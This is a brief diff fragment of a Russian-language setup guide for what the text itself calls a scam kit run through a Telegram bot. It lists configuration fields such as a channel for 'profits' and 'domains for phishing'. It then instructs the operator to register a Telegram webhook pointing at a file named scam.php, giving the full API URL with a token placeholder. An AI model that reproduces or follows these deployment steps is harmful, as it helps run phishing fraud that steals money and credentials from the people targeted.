@@ -14,6 +14,7 @@ ____
   10)*chatProfits** - ID канала профитов
   11)*allDomains** - домены дял фишинга 
  
+ ____
 2) Кинуть webhook на файлик `scam.php`
  ``` https://api.telegram.org/botTOKEN/setWebhook?url=DOMAIN/scam.php ```
   1)**TOKEN** - токен бота
